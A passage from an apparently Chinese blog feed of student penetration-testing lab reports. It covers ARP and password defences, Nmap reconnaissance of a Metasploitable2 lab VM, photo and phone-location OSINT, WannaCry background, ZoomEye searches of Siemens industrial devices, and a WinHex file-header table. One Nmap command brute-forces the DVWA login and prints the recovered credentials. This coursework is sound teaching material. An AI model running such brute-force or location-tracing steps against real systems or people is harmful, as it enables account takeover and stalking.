对网络用户和管理员进行网络安全培训，使其了解ARP攻击的风险，并教导采取预防措施。</p><h4 id="2、-安全的密码（口令）应遵循的原则。"><a href="#2、-安全的密码（口令）应遵循的原则。" class="headerlink" title="2、 安全的密码（口令）应遵循的原则。"></a>2、 安全的密码（口令）应遵循的原则。</h4><p><strong>a.长度：</strong> 使用足够长度的密码，一般来说，密码长度越长越安全。推荐至少12个字符。</p><p><strong>b.复杂性：</strong> 包含不同类型的字符，包括大写字母、小写字母、数字和特殊字符（例如！、@、#、$等）。</p><p><strong>c.避免常见词语：</strong> 避免使用容易猜测的密码，如常见单词、词典单词、生日、名字等。攻击者可能使用字典攻击来猜测这些密码。</p><p><strong>d.不重复使用：</strong> 对于不同的账户和服务，请使用不同的密码。这样，如果一个账户受到攻击，其他账户仍然安全。</p><p><strong>e.定期更改：</strong> 定期更改密码以增加安全性。虽然不需要每个月都更改，但定期更改是一个好的安全实践。</p><p><strong>f.避免个人信息：</strong> 避免在密码中使用与个人相关的信息，如姓名、生日、地址等。这些信息可能容易被猜测或获取。</p><p><strong>g.密码管理器：</strong> 使用密码管理器来生成、存储和管理强密码。密码管理器可以帮助您记住复杂的密码，而不必在多个账户之间重复使用相同的密码。</p><p><strong>h.双因素身份验证：</strong> 启用双因素身份验证，以提供额外的安全层。这通常涉及到除密码外的第二个身份验证步骤，例如手机验证码或硬件令牌。</p><p><strong>h.教育和培训：</strong> 对用户进行安全培训，教育他们有关密码安全的最佳实践，以及如何识别和防范社会工程学攻击。</p><p><strong>i.监控和更新：</strong> 定期监控账户活动，及时更新密码，特别是在发生数据泄露或安全事件后。</p><h4 id="3、-谈谈字典攻击中字典的重要性。"><a href="#3、-谈谈字典攻击中字典的重要性。" class="headerlink" title="3、 谈谈字典攻击中字典的重要性。"></a>3、 谈谈字典攻击中字典的重要性。</h4><p><strong>a.包含常见密码：</strong> 字典通常包含常见的、容易猜测的密码，如常见单词、数字组合、常见短语等。这些密码是攻击者最有可能尝试的。</p><p><strong>b.多样性：</strong> 一个好的字典文件应该包含各种类型的密码，涵盖了可能出现的不同组合和模式。这包括大小写字母、数字、特殊字符以及它们的组合。</p><p><strong>c.社会工程学元素：</strong> 一些字典可能包含基于社会工程学的信息，如常见的名字、生日、固定短语等，因为用户可能会使用与其个人信息相关的密码。</p><p><strong>d.更新和维护：</strong> 随着时间的推移，密码的使用趋势和模式可能会发生变化。一个好的字典应该定期更新，以反映新的密码趋势和流行词汇。</p><p><strong>e.攻击速度：</strong>字典攻击是一种高效的攻击方式，因为攻击者可以迅速尝试大量密码。一个包含大量可能密码的字典可以在短时间内覆盖广泛的选择。</p><p><strong>f.组合和变种：</strong> 一些字典可能包含密码的组合和变种，例如通过在单词之间添加数字、特殊字符或重复字符。这增加了攻击的成功率。</p><p><strong>f.密码生成规则：</strong> 字典文件可能包含密码生成规则，攻击者可以使用这些规则来生成更多可能的密码组合，而不仅仅是静态的字典列表。</p><p><strong>g.定制字典：</strong> 攻击者可能会创建针对特定目标的定制字典，其中包含与目标相关的信息，如公司名、产品名、关键人物名字等。</p><h4 id="4、-实验小结。"><a href="#4、-实验小结。" class="headerlink" title="4、 实验小结。"></a>4、 实验小结。</h4><p>（1）本次实验收获很大，了解了网络嗅探、ARP欺骗、密码安全等相关安全技术和问题。对相关安全和技术有了更加全面的了解。</p><p>（2）了解了ARP欺骗技术，让我们更深入了解了网关的作用，和wireshark的使用。同时，也告诉了我们，网站使用明文的方式传输密码是非常危险的，若用户遭受了arp欺骗，则很容易造成密码的泄露。</p><p>（3）ftp数据还原的部分，让我们更加熟悉了数据的获取，以及wireshark的使用，同时也对服务器有了一定的了解。</p><p>（4）密码的破解方面，让我们了解了使用弱口令很容易就被破解，破解密码的方式和工具也有很多种，熟悉了对zip文件的密码的破解，同时也熟悉了brupsuite的使用，利用brupsuite实现了对网站登录密码的暴力破解，更加理解了浏览器的原理，以及brupsuite的使用。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 网络渗透测试 </category>
          
          <category> 实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实验一 网络扫描与网络侦察</title>
      <link href="/2023/12/10/%E5%AE%9E%E9%AA%8C%E4%B8%80%20%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/"/>
      <url>/2023/12/10/%E5%AE%9E%E9%AA%8C%E4%B8%80%20%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="实验一-网络扫描与网络侦察"><a href="#实验一-网络扫描与网络侦察" class="headerlink" title="实验一 网络扫描与网络侦察"></a>实验一 网络扫描与网络侦察</h1><h2 id="1-实验目的和要求"><a href="#1-实验目的和要求" class="headerlink" title="1. 实验目的和要求"></a>1. 实验目的和要求</h2><p>实验目的：理解网络扫描、网络侦察的作用；通过搭建网络渗透测试平台，了解并熟悉常用搜索引擎、扫描工具的应用，通过信息收集为下一步渗透工作打下基础。</p><p>系统环境：Kali Linux 2、Windows</p><p>网络环境：交换网络结构</p><p>实验工具： Metasploitable2（需自行下载虚拟机镜像）；Nmap（Kali）；WinHex、数据恢复软件等</p><h2 id="2-实验原理："><a href="#2-实验原理：" class="headerlink" title="2.实验原理："></a>2.实验原理：</h2><h3 id="1、网络扫描与网络侦察的目的"><a href="#1、网络扫描与网络侦察的目的" class="headerlink" title="1、网络扫描与网络侦察的目的"></a>1、网络扫描与网络侦察的目的</h3><p>黑客在进行一次完整的攻击之前除了确定攻击目标之外，最主要的工作就是收集尽量多的关于攻击目标的信息。这些信息主要包括目标的操作系统类型及版本、目标提供哪些服务、各服务的类型、版本以及相关的社会信息。</p><p>攻击者搜集目标信息一般采用七个基本的步骤：</p><p>（1） 找到初始信息，比如一个IP地址或者一个域名；</p><p>（2） 找到网络地址范围，或者子网掩码；</p><p>（3） 找到活动机器；</p><p>（4） 找到开放端口和入口点；</p><p>（5） 弄清操作系统；</p><p>（6） 弄清每个端口运行的是哪种服务；</p><p>（7） 找到目标可能存在的漏洞。</p><h3 id="2、Google-Hacking（或baidu）"><a href="#2、Google-Hacking（或baidu）" class="headerlink" title="2、Google Hacking（或baidu）"></a>2、Google Hacking（或baidu）</h3><p>Google Hacking 是利用谷歌搜索的强大，来在浩瀚的互联网中搜索到我们需要的信息。轻量级的搜索可以搜素出一些遗留后门，不想被发现的后台入口，中量级的搜索出一些用户信息泄露，源代码泄露，未授权访问等等，重量级的则可能是mdb文件下载，CMS 未被锁定install页面，网站配置密码，php远程文件包含漏洞等重要信息。</p><h3 id="3、BASE64编码"><a href="#3、BASE64编码" class="headerlink" title="3、BASE64编码"></a>3、BASE64编码</h3><p>BASE64是一种编码方式，通常用于把二进制数据编码为可写的字符形式的数据。</p><p>编码后的数据是一个字符串，其中包含的字符为：A-Z、a-z、0-9、+、&#x2F;共64个字符。（其实是65个字符，“&#x3D;”是填充字符）。</p><p>长度为3个字节(3<em>8)的数据经过Base64编码后就变为4个字节(4</em>6)。</p><p>如果数据的字节数不是3的倍数，则其位数就不是6的倍数，那么就不能精确地划分成6位的块。需在原数据后面添加1个或2个零值字节，使其字节数是3的倍数。</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/%E5%9B%BE%E7%89%871.png"></p><p>字符串“Xue”经过Base64编码后变为“WHVl”。</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/%E5%9B%BE%E7%89%872.png"></p><p>字符串“Xu”经过Base64编码后变为“WHU&#x3D;”。</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/%E5%9B%BE%E7%89%873.png"></p><p>字符串“X”经过Base64编码后变为“WA&#x3D;&#x3D;”。</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/%E5%9B%BE%E7%89%874.png"></p><h3 id="4、Nmap"><a href="#4、Nmap" class="headerlink" title="4、Nmap"></a>4、Nmap</h3><p>Nmap是一个网络侦察和安全扫描程序，系统管理者和个人可以使用这个软件扫描大型的网络，获取哪台主机正在运行以及提供什么服务等信息。Nmap支持很多扫描技术，例如：UDP、TCP connect()、TCP SYN(半开扫描)、ftp代理(bounce攻击)、反向标志、ICMP、FIN、ACK扫描、圣诞树(Xmas Tree)、SYN扫描和null扫描。Nmap还提供了一些高级的特征，例如：通过TCP&#x2F;IP协议栈特征探测操作系统类型，秘密扫描，动态延时和重传计算，并行扫描，通过并行ping扫描探测关闭的主机，诱饵扫描，避开端口过滤检测，直接RPC扫描(无须端口映射)，碎片扫描，以及灵活的目标和端口设定。</p><p>Nmap运行通常会得到被扫描主机端口的列表。Nmap总会给出well known端口的服务名(如果可能)、端口号、状态和协议等信息。每个端口的状态有：open、filtered、unfiltered。open状态意味着目标主机能够在这个端口使用accept()系统调用接受连接。filtered状态表示：防火墙、包过滤和其它的网络安全软件掩盖了这个端口，禁止Nmap探测其是否打开。unfiltered表示：这个端口关闭，并且没有防火墙&#x2F;包过滤软件来隔离nmap的探测企图。通常情况下，端口的状态基本都是unfiltered状态，只有在大多数被扫描的端口处于filtered状态下，才会显示处于unfiltered状态的端口。</p><p>根据使用的功能选项，Nmap也可以报告远程主机的下列特征：使用的操作系统、TCP序列、运行绑定到每个端口上的应用程序的用户名、DNS名、主机地址是否是欺骗地址、以及其它一些东西。</p><h3 id="5、WinHex"><a href="#5、WinHex" class="headerlink" title="5、WinHex"></a>5、WinHex</h3><p>WinHex  是一款以通用的 16 进制编辑器为核心，专门用来对付计算机取证、数据恢复、低级数据处理、以及 IT 安全性、各种日常紧急情况的高级工具： 用来检查和修复各种文件、恢复删除文件、硬盘损坏、数码相机卡损坏造成的数据丢失等。</p><h2 id="3-实验步骤"><a href="#3-实验步骤" class="headerlink" title="3. 实验步骤"></a>3. 实验步骤</h2><h3 id="1、用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network-security”的pdf文档，截图搜索得到的页面。"><a href="#1、用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network-security”的pdf文档，截图搜索得到的页面。" class="headerlink" title="1、用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network security”的pdf文档，截图搜索得到的页面。"></a>1、用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network security”的pdf文档，截图搜索得到的页面。</h3><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/1.png"></p><h3 id="2、照片中的女生在哪里旅行？截图搜索到的地址信息。"><a href="#2、照片中的女生在哪里旅行？截图搜索到的地址信息。" class="headerlink" title="2、照片中的女生在哪里旅行？截图搜索到的地址信息。"></a>2、照片中的女生在哪里旅行？截图搜索到的地址信息。</h3><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/2-1.png"></p><p>回答：使用搜索引擎得到地址，再通过谷歌地图找到门店（需要调整时间）</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/2-2.png"></p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/2-3.png"></p><h3 id="3、手机位置定位。"><a href="#3、手机位置定位。" class="headerlink" title="3、手机位置定位。"></a>3、手机位置定位。</h3><p>通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。</p><p>获取自己手机的LAC和CID：</p><p>Android 获取方法：Android： 拨号*#<em>#4636#</em>#*进入手机信息工程模式后查看</p><p>iphone获取方法：iPhone：拨号*3001#12345#*进入FieldTest</p><p>Serving Cell info–&gt;LAC&#x3D;Tracking Area Code –&gt;cellid &#x3D; Cell identity</p><p>若不能获取，用右图信息。</p><p>截图你查询到的位置信息。</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/3-1.png.jpg"></p><p>回答：使用右图信息</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/3-2.png"></p><h3 id="4、编码解码"><a href="#4、编码解码" class="headerlink" title="4、编码解码"></a>4、编码解码</h3><p>将Z29vZCBnb29kIHN0dWR5IQ&#x3D;&#x3D;解码。截图。</p><p>回答：</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/4-1.png"></p><h3 id="5、地址信息"><a href="#5、地址信息" class="headerlink" title="5、地址信息"></a>5、地址信息</h3><h4 id="5-1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202-193-64-34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。"><a href="#5-1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202-193-64-34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。" class="headerlink" title="5.1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。"></a>5.1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。</h4><p>回答：该用户使用的设备为苹果品牌</p><p>该IP定位为“广西桂林市桂林电子科技大学”</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/5-1-1.png"></p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/5-1-2.png"></p><h4 id="5-2-访问https-whatismyipaddress-com得到MyIP信息，利用ipconfig-Windows-或ifconfig-Linux-查看本机IP地址，两者值相同吗？如果不相同的话，说明原因"><a href="#5-2-访问https-whatismyipaddress-com得到MyIP信息，利用ipconfig-Windows-或ifconfig-Linux-查看本机IP地址，两者值相同吗？如果不相同的话，说明原因" class="headerlink" title="5.2 访问https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因"></a>5.2 访问<a href="https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因">https://whatismyipaddress.com得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因</a></h4><p>回答：不相同，原因：</p><p> 我们能够上网靠的是isp组织分给我们的Ip地址，但是这个ip地址一般不是给个人的，一般都是给一个单位，一个区域的，也就是说我们实际上能接触到的一般都是私有地址，即我们用ipconig查到的都是私有地址，也就相当于局域网内的ip地址，当我们真正联网时，会先把数据发送到路由，然后再由路由进行处理实现真正的联网操作，路由的地址才是真正联网的Ip地址，也就是pubilc ip，而我们在自己电脑上查到的都是私有ip</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/5-2-1.png"></p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/5-2-2.png"></p><h3 id="6、NMAP使用"><a href="#6、NMAP使用" class="headerlink" title="6、NMAP使用"></a>6、NMAP使用</h3><h4 id="6-1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能"><a href="#6-1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能" class="headerlink" title="6.1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能"></a>6.1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能</h4><p>回答:通过NMAP扫描整个子网得到Metasploitable2的ip以及开发端口</p><p>其中</p><p>a.80端口为web服务</p><p>b.3306端口为MySQL数据库服务</p><p>C.21端口主要用于FTP（File Transfer Protocol，文件传输协议）服务。</p><p>FTP服务主要是为了在两台计算机之间实现文件的上传与下载，一台计算机作为FTP客户端，另一台计算机作为FTP服务器，可以采用匿名（anonymous）登录和授权用户名与密码登录两种方式登录FTP服务器。</p><p>d.22端口主要用于SSH(Secure SHell)</p><p>SSH的英文全称是Secure SHell。通过使用SSH，你可以把所有传输的数据进行加密，这样“中间人”这种攻击方式就不可能实现了，而且也能够防止DNS和IP欺骗。还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替telnet，又可以为ftp、pop、甚至ppp提供一个安全的“通道”</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/6-1-1.png"></p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/6-1-2.png"></p><h4 id="6-2利用NMAP扫描Metasploitable2的操作系统类型，并附截图"><a href="#6-2利用NMAP扫描Metasploitable2的操作系统类型，并附截图" class="headerlink" title="6.2利用NMAP扫描Metasploitable2的操作系统类型，并附截图"></a>6.2利用NMAP扫描Metasploitable2的操作系统类型，并附截图</h4><p>回答：扫描命令为“nmap -O +目标 IP”</p><p>Metasploitable2的操作系统为linux</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/6-2-1.png"></p><h4 id="6-3-利用NMAP穷举-Metasploitable2上dvwa的登录账号和密码"><a href="#6-3-利用NMAP穷举-Metasploitable2上dvwa的登录账号和密码" class="headerlink" title="6.3 利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码"></a>6.3 利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码</h4><p>回答：nmap -p80 –script http-form-brute –script-args http-form-brute.path&#x3D;&#x2F;dvwa&#x2F;login.php 192.168.154.142 -d</p><p>账号&#x2F;密码admin&#x2F;password</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/11.png"></p><h4 id="6-4-查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。"><a href="#6-4-查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。" class="headerlink" title="6.4 查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。"></a>6.4 查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。</h4><p>回答：WannaCry（又叫Wanna Decryptor），一种“蠕虫式”的<a href="https://baike.baidu.com/item/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/16623990?fromModule=lemma_inlink">勒索病毒</a>软件，大小3.3MB，由不法分子利用<a href="https://baike.baidu.com/item/NSA/1128824?fromModule=lemma_inlink">NSA</a>（National Security Agency，<a href="https://baike.baidu.com/item/%E7%BE%8E%E5%9B%BD%E5%9B%BD%E5%AE%B6%E5%AE%89%E5%85%A8%E5%B1%80/300052?fromModule=lemma_inlink">美国国家安全局</a>）泄露的危险漏洞“EternalBlue”（永恒之蓝）进行传播 [1]。勒索病毒肆虐，俨然是一场全球性互联网灾难，给广大电脑用户造成了巨大损失。最新统计数据显示，100多个国家和地区超过10万台电脑遭到了勒索病毒攻击、感染。 [2]勒索病毒是自熊猫烧香以来影响力最大的<a href="https://baike.baidu.com/item/%E7%97%85%E6%AF%92/4811584?fromModule=lemma_inlink">病毒</a>之一。WannaCry勒索病毒全球大爆发，至少150个国家、30万名用户中招，造成损失达80亿美元，已经影响到金融，能源，医疗等众多行业，造成严重的危机管理问题。中国部分Windows操作系统用户遭受感染，校园网用户首当其冲，受害严重，大量实验室数据和毕业设计被锁定加密。部分大型企业的应用系统和数据库文件被加密后，无法正常工作，影响巨大。</p><h4 id="7、利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。"><a href="#7、利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。" class="headerlink" title="7、利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。"></a>7、利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题。</h4><p>回答：1. Apache Struts 目录遍历导致文件上传漏洞</p><p>Apache Struts是美国阿帕奇（Apache）软件基金会下属的Jakarta项目中的一个子项目，是一个基于MVC设计的Web应用框架。漏洞源于文件上传逻辑存在缺陷，攻击者可利用上传文件参数启动路径遍历，上传恶意文件，进而导致远程代码执行。</p><p>2.Apache ActiveMQ jolokia 远程代码执行漏洞</p><p> Apache ActiveMQ 中存在<a href="https://so.csdn.net/so/search?q=%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C&spm=1001.2101.3001.7020">远程代码执行</a>漏洞，具有 Apache ActiveMQ 服务器TCP端口（默认为61616）访问权限的远程攻击者可以通过发送恶意数据到服务器从而执行任意代码。</p><p>3.CVE-2019-0211 Apache Root Privilege Escalation</p><p>在MPM prefork中，以root身份运行的主服务器进程管理一个单线程、低权限（www-data）的工作进程池，用于处理HTTP请求。为了从工作进程那里获得反馈，Apache维护了一个共享内存区域（SHM）计分板，其中包含各种信息，例如工作进程的PID，以及它们处理的最后一个请求。每个工作进程都以维护与其PID相关联的process_score结构为目标，并且具有对SHM的完全读&#x2F;写访问权限。</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/7-1.png"></p><h3 id="8、Winhex简单数据恢复与取证"><a href="#8、Winhex简单数据恢复与取证" class="headerlink" title="8、Winhex简单数据恢复与取证"></a>8、Winhex简单数据恢复与取证</h3><h4 id="8-1-elephant-jpg不能打开了，利用WinHex修复，说明修复过程。"><a href="#8-1-elephant-jpg不能打开了，利用WinHex修复，说明修复过程。" class="headerlink" title="8.1 elephant.jpg不能打开了，利用WinHex修复，说明修复过程。"></a>8.1 elephant.jpg不能打开了，利用WinHex修复，说明修复过程。</h4><p>回答：文件类型为jpg文件，但文件头却为00 00 FF E0,jpg文件的文件头应为FF D8 FF E0,修改文件头得到图片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">一、常见文件头文件尾</span><br><span class="line">1、图片</span><br><span class="line">JPEG 文件头：FF D8 FF 文件尾：FF D9</span><br><span class="line">TGA 未压缩的前4字节 00 00 02 00 RLE压缩的前5字节 00 00 10 00 00</span><br><span class="line">PNG 文件头：89 50 4E 47 0D 0A 1A 0A 文件尾：AE 42 60 82</span><br><span class="line">GIF 文件头：47 49 46 38 39(37) 61 文件尾：00 3B</span><br><span class="line">BMP 文件头：42 4D 文件头标识(2 bytes) 42(B) 4D(M)</span><br><span class="line">TIFF (tif) 文件头：49 49 2A 00</span><br><span class="line">ico 文件头：00 00 01 00</span><br><span class="line">Adobe Photoshop (psd) 文件头：38 42 50 53</span><br><span class="line">2、office文件</span><br><span class="line">MS Word/Excel (xls.or.doc) 文件头：D0 CF 11 E0</span><br><span class="line">MS Access (mdb) 文件头：53 74 61 6E 64 61 72 64 20 4A</span><br><span class="line">WordPerfect (wpd) 文件头：FF 57 50 43</span><br><span class="line">Adobe Acrobat (pdf) 文件头：25 50 44 46 2D 31 2E</span><br><span class="line">application/vnd.visio(vsd) 文件头：D0 CF 11 E0 A1 B1 1A E1</span><br><span class="line">Email [thorough only] (eml) 文件头：44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A</span><br><span class="line">Outlook Express (dbx) 文件头：CF AD 12 FE C5 FD 74 6F</span><br><span class="line">Outlook (pst) 文件头：21 42 44 4E</span><br><span class="line">Rich Text Format (rtf) 文件头：7B 5C 72 74 66</span><br><span class="line">txt 文件(txt) 文件头：Unicode：FE FF / Unicode big endian：FF FE / UTF-8：EF BB BF /ANSI编码是没有文件头的</span><br><span class="line">3、压缩包文件</span><br><span class="line">ZIP Archive (zip) 文件头：50 4B 03 04 文件尾：50 4B</span><br><span class="line">RAR Archive (rar) 文件头：52 61 72 21</span><br><span class="line">4、音频文件</span><br><span class="line">Wave (wav) 文件头：57 41 56 45</span><br><span class="line">audio(Audio) 文件头： 4D 54 68 64</span><br><span class="line">audio/x-aac（aac）</span><br><span class="line">文件头：FF F1(9)</span><br><span class="line">5、视频文件</span><br><span class="line">AVI (avi) 文件头：41 56 49 20</span><br><span class="line">Real Audio (ram) 文件头：2E 72 61 FD</span><br><span class="line">Real Media (rm) 文件头：2E 52 4D 46</span><br><span class="line">MPEG (mpg) 文件头：00 00 01 BA(3)</span><br><span class="line">Quicktime (mov) 文件头：6D 6F 6F 76</span><br><span class="line">Windows Media (asf) 文件头：30 26 B2 75 8E 66 CF 11</span><br><span class="line">MIDI (mid) 文件头：4D 54 68 64</span><br><span class="line">6、代码文件</span><br><span class="line">XML (xml) 文件头：3C 3F 78 6D 6C</span><br><span class="line">HTML (html) 文件头：68 74 6D 6C 3E</span><br><span class="line">Quicken (qdf) 文件头：AC 9E BD 8F</span><br><span class="line">Windows Password (pwl) 文件头：E3 82 85 96</span><br><span class="line">7、其他类型</span><br><span class="line">windows证书文件(der) 文件头：30 82 03 C9</span><br><span class="line">CAD (dwg) 文件头：41 43 31 30</span><br><span class="line">Windows Shortcut (lnk) 文件头：4C 00 00 00</span><br><span class="line">Windows reg(reg) 文件头：52 45 47 45 44 49 54 34</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/8-1-1.png"></p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/8-1-2.png"></p><p><img 